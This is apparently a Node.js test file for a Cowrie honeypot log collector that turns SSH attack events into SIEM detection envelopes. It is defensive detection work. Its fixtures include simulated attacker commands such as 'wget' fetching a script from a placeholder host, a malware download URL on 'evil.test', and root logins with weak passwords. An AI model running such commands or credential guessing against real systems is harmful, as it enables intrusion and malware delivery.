'use strict';

const { test } = require('node:test');
const assert = require('node:assert');
const { createCowrieCollector, COWRIE_EVENT_MAP } = require('../src/collector/cowrieCollector');
const { buildEnvelope } = require('../src/collector/buildEnvelope');
const { validateEnvelope } = require('../src/contract/eventEnvelopeV1');
const { runCollectorPipeline } = require('../src/collector/runCollectorPipeline');
const { fuse } = require('../src/engine/crossDomainFusion');

// TEST-NET-IPs (RFC5737) — keine realen Infra-Adressen im Repo.
const HONEYPOT = '192.0.2.10';
const ATTACKER = '198.51.100.23';
const base = {
  sensor: 'nexora-hp', session: 'a1b2c3d4',
  src_ip: ATTACKER, src_port: 55012, dst_ip: HONEYPOT, dst_port: 2222,
  timestamp: '2026-06-24T21:00:00.000Z',
};
const LOGIN_FAILED = JSON.stringify({ ...base, eventid: 'cowrie.login.failed', username: 'root', password: '123456' });
const LOGIN_OK = JSON.stringify({ ...base, eventid: 'cowrie.login.success', username: 'root', password: 'admin' });
const CMD = JSON.stringify({ ...base, eventid: 'cowrie.command.input', input: 'wget http://example.test/x.sh' });
const CONNECT = JSON.stringify({ ...base, eventid: 'cowrie.session.connect' }); // Rauschen → null

test('createCowrieCollector: Identität (siem/cowrie)', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  assert.strictEqual(k.domain, 'siem');
  assert.strictEqual(k.source.vendor, 'cowrie');
  assert.strictEqual(k.source.type, 'siem');
});

test('honeypotIp ist Pflicht (Pairing-Anker)', () => {
  assert.throws(() => createCowrieCollector({ instanceId: 'hp-1' }), /honeypotIp/);
});

test('normalize login.failed: detection medium + MITRE T1110 + observedAt', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const part = k.normalize(LOGIN_FAILED);
  assert.strictEqual(part.detection.severity, 'medium');
  assert.strictEqual(part.detection.ruleId, 'cowrie.login.failed');
  assert.deepStrictEqual(part.detection.mitre, ['T1110']);
  assert.strictEqual(part.observedAt, new Date('2026-06-24T21:00:00.000Z').toISOString());
});

test('normalize login.success / command.input: high', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  assert.strictEqual(k.normalize(LOGIN_OK).detection.severity, 'high');
  assert.strictEqual(k.normalize(CMD).detection.severity, 'high');
  assert.deepStrictEqual(k.normalize(CMD).detection.mitre, ['T1059']);
});

test('network: dstIp wird auf honeypotIp verankert (matcht conntrack-Paar)', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const part = k.normalize(LOGIN_FAILED);
  assert.strictEqual(part.network.srcIp, ATTACKER);
  assert.strictEqual(part.network.dstIp, HONEYPOT);
  assert.strictEqual(part.network.dstPort, 2222);
  assert.strictEqual(part.network.protocol, 'tcp');
  const vals = part.entities.map((e) => e.value);
  assert.ok(vals.includes(ATTACKER));
  assert.ok(vals.includes(HONEYPOT));
  assert.ok(vals.includes('nexora-hp')); // sensor als host-entity
});

test('Rausch-Gate: nicht-detektierbare Events + kaputtes JSON → null', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  assert.strictEqual(k.normalize(CONNECT), null);                       // session.connect
  assert.strictEqual(k.normalize('{nope'), null);                       // kaputt
  assert.strictEqual(k.normalize(JSON.stringify({ eventid: 'cowrie.login.failed' })), null); // ohne src_ip
});

test('login.failed → buildEnvelope → contract-konform', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const env = buildEnvelope(k, k.normalize(LOGIN_FAILED));
  assert.strictEqual(validateEnvelope(env).valid, true);
  assert.strictEqual(env.source.type, 'siem');
  assert.strictEqual(env.normalized.detection.ruleId, 'cowrie.login.failed');
});

test('runCollectorPipeline: nur detektierbare Cowrie-Events emittiert', async () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const out = [];
  const stats = await runCollectorPipeline(k, [LOGIN_FAILED, CONNECT, CMD, '{nope'], { emit: (e) => out.push(e) });
  assert.strictEqual(stats.emitted, 2); // failed + cmd; connect/broken verworfen
  assert.ok(out.every((e) => validateEnvelope(e).valid));
});

// ── Cross-Domain-Kern: conntrack-Flow ALLEIN = observed; + Cowrie-Detection = suspicious ──
test('Cross-Domain-Eskalation: Flow allein observed → mit Cowrie suspicious', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const cowrieEnv = buildEnvelope(k, k.normalize(LOGIN_FAILED));
  const flowEnv = {
    schemaVersion: '1.0', eventId: '11111111-1111-4111-8111-111111111111',
    observedAt: '2026-06-24T21:00:05.000Z',
    source: { type: 'ids', vendor: 'conntrack', instanceId: 'vps-1' },
    raw: { hash: 'a'.repeat(64), ref: 'conntrack:flow:1' },
    provenance: { parserVersion: '0.1.0', confidence: 1 },
    normalized: { network: { srcIp: ATTACKER, dstIp: HONEYPOT, dstPort: 22, protocol: 'tcp', bytesToServer: 1840, bytesToClient: 1450 } },
  };
  assert.strictEqual(fuse([flowEnv]).verdict, 'observed');
  const fused = fuse([flowEnv, cowrieEnv]);
  assert.strictEqual(fused.verdict, 'suspicious');
  assert.ok(fused.domains.includes('ids') && fused.domains.includes('siem'));
  assert.strictEqual(fused.network.bytesToServer, 1840);           // Bytes vom conntrack-Flow
  assert.ok(fused.signatures.some((s) => /brute|login/i.test(s))); // Signatur von Cowrie
  assert.deepStrictEqual(fused.mitre, ['T1110']);
});

test('COWRIE_EVENT_MAP deckt die Kern-Events', () => {
  for (const id of ['cowrie.login.failed', 'cowrie.login.success', 'cowrie.command.input']) {
    assert.ok(COWRIE_EVENT_MAP[id], `${id} fehlt`);
  }
});

// ── activity: die Sitzungs-Aktivität (Befehl/Login/Download/Tunnel) trägt bis ins Ticket ──
test('activity command: cowrie.command.input → { kind:command, value:<input> }', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const part = k.normalize(CMD);
  assert.deepStrictEqual(part.activity, { kind: 'command', value: 'wget http://example.test/x.sh' });
});

test('activity login: cowrie.login.* → { kind:login, user } — OHNE Passwort (DSGVO/Security)', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const failed = k.normalize(LOGIN_FAILED);
  assert.strictEqual(failed.activity.kind, 'login');
  assert.strictEqual(failed.activity.user, 'root');
  assert.ok(!('password' in failed.activity), 'kein Passwort im Envelope');
  assert.strictEqual(JSON.stringify(failed.activity).includes('123456'), false);
  const ok = k.normalize(LOGIN_OK);
  assert.strictEqual(ok.activity.kind, 'login');
  assert.strictEqual(ok.activity.user, 'root');
});

test('activity download: cowrie.session.file_download → { kind:download, value:url||outfile }', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const withUrl = k.normalize(JSON.stringify({ ...base, eventid: 'cowrie.session.file_download', url: 'http://evil.test/m', outfile: '/tmp/m' }));
  assert.deepStrictEqual(withUrl.activity, { kind: 'download', value: 'http://evil.test/m' });
  const outfileOnly = k.normalize(JSON.stringify({ ...base, eventid: 'cowrie.session.file_download', outfile: '/tmp/m' }));
  assert.deepStrictEqual(outfileOnly.activity, { kind: 'download', value: '/tmp/m' });
});

test('activity tunnel: cowrie.direct-tcpip.request → { kind:tunnel, value:dst[:port] }', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const part = k.normalize(JSON.stringify({ ...base, eventid: 'cowrie.direct-tcpip.request', dst_ip: '203.0.113.9', dst_port: 25 }));
  assert.strictEqual(part.activity.kind, 'tunnel');
  assert.strictEqual(part.activity.value, '203.0.113.9:25');
});

test('activity: fehlender Aktivitäts-Wert → kein activity-Feld, kein Crash', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  // command.input ohne input-Feld → detektierbar, aber keine Aktivität
  const noInput = k.normalize(JSON.stringify({ ...base, eventid: 'cowrie.command.input' }));
  assert.ok(!('activity' in noInput), 'kein leeres activity');
});

test('activity: Wert wird längen-gecappt (untrusted Honeypot-Input)', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const huge = 'A'.repeat(5000);
  const part = k.normalize(JSON.stringify({ ...base, eventid: 'cowrie.command.input', input: huge }));
  assert.ok(part.activity.value.length <= 2000, `Länge ${part.activity.value.length} > 2000`);
});

test('activity trägt durch buildEnvelope in normalized.activity (contract-konform)', () => {
  const k = createCowrieCollector({ instanceId: 'hp-1', honeypotIp: HONEYPOT });
  const env = buildEnvelope(k, k.normalize(CMD));
  assert.strictEqual(validateEnvelope(env).valid, true);
  assert.deepStrictEqual(env.normalized.activity, { kind: 'command', value: 'wget http://example.test/x.sh' });
});
